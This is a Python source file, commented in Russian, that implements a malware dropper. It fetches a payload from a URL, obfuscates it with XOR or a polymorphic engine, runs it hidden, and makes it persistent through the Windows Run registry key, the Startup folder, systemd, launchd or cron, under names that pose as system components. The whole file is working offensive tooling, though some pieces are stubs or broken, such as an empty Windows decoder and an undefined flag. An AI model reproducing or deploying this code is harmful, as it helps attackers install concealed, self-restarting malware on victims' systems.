#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dropper: Модуль для доставки и загрузки зондов на целевые системы.

Этот модуль обеспечивает функциональность для скрытой доставки,
сохранения и активации зондов на целевых машинах с различными
методами обеспечения персистентности.
"""

import os
import sys
import platform
import base64
import random
import tempfile
import subprocess
import ctypes
import shutil
from typing import Optional, List, Dict, Any, Tuple
from src.polymorpher import PolyMorpher

class Dropper:
    """Класс для доставки и загрузки зондов на целевые системы."""
    
    def __init__(self, 
                 payload_data: bytes = None, 
                 payload_url: str = None, 
                 obfuscate: bool = True):
        """
        Инициализация дроппера.
        
        Args:
            payload_data: Бинарные данные зонда (опционально)
            payload_url: URL для скачивания зонда (опционально)
            obfuscate: Применять ли обфускацию к зонду
        """
        self.payload_data = payload_data
        self.payload_url = payload_url
        self.obfuscate = obfuscate
        self.system = platform.system().lower()  # windows, linux, darwin
        
    def drop_and_execute(self, 
                         persistence: bool = True, 
                         method: str = "auto") -> Dict[str, Any]:
        """
        Доставляет, сохраняет и запускает зонд на целевой системе.
        
        Args:
            persistence: Обеспечивать ли персистентность
            method: Метод запуска "auto", "service", "registry", "cron", "startup"
            
        Returns:
            Словарь с результатами операции
        """
        # Получаем payload, если он не был предоставлен напрямую
        if self.payload_data is None and self.payload_url is not None:
            self.payload_data = self._download_payload()
            if not self.payload_data:
                return {"status": "error", "message": "Failed to download payload"}
        
        # Обфускация, если требуется
        if self.obfuscate and self.payload_data and POLYMORPHER_AVAILABLE:
            self.payload_data = self._obfuscate_payload()
        
        # Сохраняем payload во временный файл
        payload_path = self._save_payload()
        if not payload_path:
            return {"status": "error", "message": "Failed to save payload"}
        
        # Выбираем метод запуска
        if method == "auto":
            if self.system == "windows":
                method = "registry"
            elif self.system == "linux" or self.system == "darwin":
                method = "cron"
                
        # Запускаем payload
        execution_result = self._execute_payload(payload_path)
        if not execution_result.get("success"):
            return {"status": "error", "message": "Failed to execute payload"}
            
        # Обеспечиваем персистентность, если требуется
        if persistence:
            persistence_result = self._setup_persistence(payload_path, method)
            if not persistence_result.get("success"):
                return {
                    "status": "warning", 
                    "message": "Payload executed but persistence failed",
                    "execution": execution_result,
                    "persistence": persistence_result
                }
                
        return {
            "status": "success", 
            "message": "Payload dropped and executed successfully",
            "execution": execution_result,
            "persistence": persistence_result if persistence else None,
            "path": payload_path
        }
            
    def _download_payload(self) -> Optional[bytes]:
        """Скачивает payload по указанному URL."""
        try:
            import requests
            response = requests.get(self.payload_url, timeout=30)
            if response.status_code == 200:
                return response.content
        except Exception:
            pass
        return None
    
    def _obfuscate_payload(self) -> bytes:
        """Применяет обфускацию к payload."""
        if not POLYMORPHER_AVAILABLE:
            return self.payload_data
            
        try:
            # Если это Python-скрипт
            if self.payload_data.startswith(b"#!/usr/bin") or self.payload_data.startswith(b"# -*- coding"):
                # Декодируем в текст, обфусцируем и кодируем обратно
                code = self.payload_data.decode('utf-8')
                morpher = PolyMorpher(randomization_level=4)
                transformed_code = morpher.transform_code(code)
                return transformed_code.encode('utf-8')
            # Если это бинарный файл
            else:
                # Простая XOR-обфускация для бинарных данных
                key = random.randint(1, 255)
                obfuscated = bytearray(len(self.payload_data))
                for i in range(len(self.payload_data)):
                    obfuscated[i] = self.payload_data[i] ^ key
                # Добавляем декодер в начало файла
                if self.system == "windows":
                    decoder = self._get_windows_decoder(key)
                else:
                    decoder = self._get_unix_decoder(key)
                return decoder + bytes(obfuscated)
        except Exception:
            # В случае ошибки возвращаем исходные данные
            return self.payload_data
    
    def _get_windows_decoder(self, key: int) -> bytes:
        """Генерирует Windows-декодер для XOR-обфускации."""
        # Заглушка - здесь должен быть реальный shellcode для декодирования
        return b""
    
    def _get_unix_decoder(self, key: int) -> bytes:
        """Генерирует Unix-декодер для XOR-обфускации."""
        decoder = f"""#!/bin/sh
# Self-decoding payload
echo "Decoding payload..."
PAYLOAD=$(cat $0 | tail -n +10)
echo "$PAYLOAD" | python3 -c "import sys, base64; data = base64.b64decode(sys.stdin.read()); print(''.join(chr(b ^ {key}) for b in data))" > /tmp/payload_decoded
chmod +x /tmp/payload_decoded
/tmp/payload_decoded
exit 0
# --- Payload begins below ---
"""
        return decoder.encode('utf-8')
    
    def _save_payload(self) -> Optional[str]:
        """Сохраняет payload во временный файл."""
        try:
            # Используем случайное имя файла
            prefix = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
            
            if self.system == "windows":
                temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "C:\\Windows\\Temp"))
                if not self.payload_data.startswith(b"#!/usr/bin"):
                    ext = ".exe"  # Для бинарных файлов
                else:
                    ext = ".py"  # Для Python-скриптов
            else:
                temp_dir = "/tmp"
                ext = ""  # Для Unix-систем расширение не обязательно
                
            payload_path = os.path.join(temp_dir, f"{prefix}{ext}")
            
            with open(payload_path, "wb") as f:
                f.write(self.payload_data)
                
            # Делаем файл исполняемым на Unix-системах
            if self.system != "windows":
                os.chmod(payload_path, 0o755)
                
            return payload_path
        except Exception:
            return None
    
    def _execute_payload(self, payload_path: str) -> Dict[str, Any]:
        """Запускает payload на целевой системе."""
        try:
            # Выбираем метод запуска в зависимости от системы и типа файла
            if self.system == "windows":
                if payload_path.endswith(".py"):
                    subprocess.Popen(["pythonw", payload_path], 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE,
                                     creationflags=0x08000000)  # CREATE_NO_WINDOW
                else:
                    subprocess.Popen([payload_path], 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE,
                                     creationflags=0x08000000)  # CREATE_NO_WINDOW
            else:
                subprocess.Popen([payload_path], 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE,
                                 start_new_session=True)  # Отсоединяем от родительского процесса
                
            return {"success": True, "message": "Payload executed"}
        except Exception as e:
            return {"success": False, "message": f"Execution failed: {str(e)}"}
    
    def _setup_persistence(self, payload_path: str, method: str) -> Dict[str, Any]:
        """Настраивает персистентность зонда на целевой системе."""
        if method == "registry" and self.system == "windows":
            return self._setup_registry_persistence(payload_path)
        elif method == "startup" and self.system == "windows":
            return self._setup_startup_persistence(payload_path)
        elif method == "service" and (self.system == "linux" or self.system == "darwin"):
            return self._setup_service_persistence(payload_path)
        elif method == "cron" and (self.system == "linux" or self.system == "darwin"):
            return self._setup_cron_persistence(payload_path)
        else:
            return {"success": False, "message": f"Unsupported persistence method: {method}"}
    
    def _setup_registry_persistence(self, payload_path: str) -> Dict[str, Any]:
        """Настраивает персистентность через реестр Windows."""
        try:
            # Копируем payload в постоянное место
            username = os.environ.get("USERNAME", "User")
            permanent_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\WindowsSystem.exe"
            shutil.copy2(payload_path, permanent_path)
            
            # Добавляем запись в реестр
            import winreg
            reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            winreg.SetValueEx(reg_key, "WindowsSystem", 0, winreg.REG_SZ, permanent_path)
            winreg.CloseKey(reg_key)
            
            return {"success": True, "message": "Registry persistence established", "path": permanent_path}
        except Exception as e:
            return {"success": False, "message": f"Registry persistence failed: {str(e)}"}
    
    def _setup_startup_persistence(self, payload_path: str) -> Dict[str, Any]:
        """Настраивает персистентность через папку автозагрузки Windows."""
        try:
            # Копируем payload в постоянное место
            username = os.environ.get("USERNAME", "User")
            startup_folder = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            os.makedirs(startup_folder, exist_ok=True)
            
            shortcut_path = os.path.join(startup_folder, "WindowsSystem.lnk")
            self._create_shortcut(payload_path, shortcut_path)
            
            return {"success": True, "message": "Startup persistence established", "path": shortcut_path}
        except Exception as e:
            return {"success": False, "message": f"Startup persistence failed: {str(e)}"}
    
    def _create_shortcut(self, target_path: str, shortcut_path: str) -> None:
        """Создает ярлык для файла (Windows)."""
        try:
            # Используем PowerShell для создания ярлыка
            ps_command = f"""
            $WshShell = New-Object -comObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
            $Shortcut.TargetPath = "{target_path}"
            $Shortcut.Save()
            """
            subprocess.run(["powershell", "-Command", ps_command], 
                           stdout=subprocess.PIPE, 
                           stderr=subprocess.PIPE,
                           check=True)
        except Exception:
            # Если PowerShell не работает, пытаемся использовать другой метод
            pass
    
    def _setup_service_persistence(self, payload_path: str) -> Dict[str, Any]:
        """Настраивает персистентность через systemd (Linux) или launchd (macOS)."""
        if self.system == "linux":
            return self._setup_systemd_service(payload_path)
        elif self.system == "darwin":
            return self._setup_launchd_service(payload_path)
        return {"success": False, "message": "Unsupported system for service persistence"}
    
    def _setup_systemd_service(self, payload_path: str) -> Dict[str, Any]:
        """Настраивает персистентность через systemd (Linux)."""
        try:
            # Копируем payload в постоянное место
            permanent_path = "/usr/local/bin/system_monitor"
            # Нужны права root
            if os.geteuid() != 0:
                return {"success": False, "message": "Root privileges required for systemd persistence"}
                
            shutil.copy2(payload_path, permanent_path)
            os.chmod(permanent_path, 0o755)
            
            # Создаем systemd service файл
            service_content = f"""[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart={permanent_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
            service_path = "/etc/systemd/system/system_monitor.service"
            with open(service_path, "w") as f:
                f.write(service_content)
                
            # Активируем и запускаем службу
            subprocess.run(["systemctl", "daemon-reload"], check=True)
            subprocess.run(["systemctl", "enable", "system_monitor"], check=True)
            subprocess.run(["systemctl", "start", "system_monitor"], check=True)
            
            return {"success": True, "message": "Systemd service persistence established", "path": permanent_path}
        except Exception as e:
            return {"success": False, "message": f"Systemd persistence failed: {str(e)}"}
    
    def _setup_launchd_service(self, payload_path: str) -> Dict[str, Any]:
        """Настраивает персистентность через launchd (macOS)."""
        try:
            # Копируем payload в постоянное место
            username = os.environ.get("USER", "user")
            permanent_path = f"/Users/{username}/Library/Application Support/system_monitor"
            shutil.copy2(payload_path, permanent_path)
            os.chmod(permanent_path, 0o755)
            
            # Создаем plist файл
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.monitor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{permanent_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            plist_path = f"/Users/{username}/Library/LaunchAgents/com.apple.system.monitor.plist"
            with open(plist_path, "w") as f:
                f.write(plist_content)
                
            # Загружаем и запускаем агент
            subprocess.run(["launchctl", "load", plist_path], check=True)
            
            return {"success": True, "message": "Launchd persistence established", "path": permanent_path}
        except Exception as e:
            return {"success": False, "message": f"Launchd persistence failed: {str(e)}"}
    
    def _setup_cron_persistence(self, payload_path: str) -> Dict[str, Any]:
        """Настраивает персистентность через crontab (Linux/macOS)."""
        try:
            # Копируем payload в постоянное место
            if self.system == "linux":
                username = os.environ.get("USER", "user")
                permanent_path = f"/home/{username}/.local/bin/system_monitor"
            else:  # darwin
                username = os.environ.get("USER", "user")
                permanent_path = f"/Users/{username}/Library/Application Support/system_monitor"
                
            os.makedirs(os.path.dirname(permanent_path), exist_ok=True)
            shutil.copy2(payload_path, permanent_path)
            os.chmod(permanent_path, 0o755)
            
            # Добавляем запись в crontab
            cron_job = f"@reboot {permanent_path}\n*/10 * * * * {permanent_path}\n"
            
            # Получаем текущий crontab
            process = subprocess.run(["crontab", "-l"], 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE)
            current_crontab = process.stdout.decode("utf-8")
            
            # Добавляем нашу запись, если её ещё нет
            if permanent_path not in current_crontab:
                new_crontab = current_crontab + cron_job
                # Устанавливаем обновленный crontab
                subprocess.run(["crontab", "-"], 
                               input=new_crontab.encode("utf-8"), 
                               check=True)
            
            return {"success": True, "message": "Cron persistence established", "path": permanent_path}
        except Exception as e:
            return {"success": False, "message": f"Cron persistence failed: {str(e)}"}

# Пример использования
if __name__ == "__main__":
    # Тестовый пример
    test_payload = b"#!/bin/sh\necho 'Test payload executed' > /tmp/dropper_test.log\n"
    dropper = Dropper(payload_data=test_payload, obfuscate=True)
    result = dropper.drop_and_execute(persistence=True)
    print(f"Dropper result: {result}") 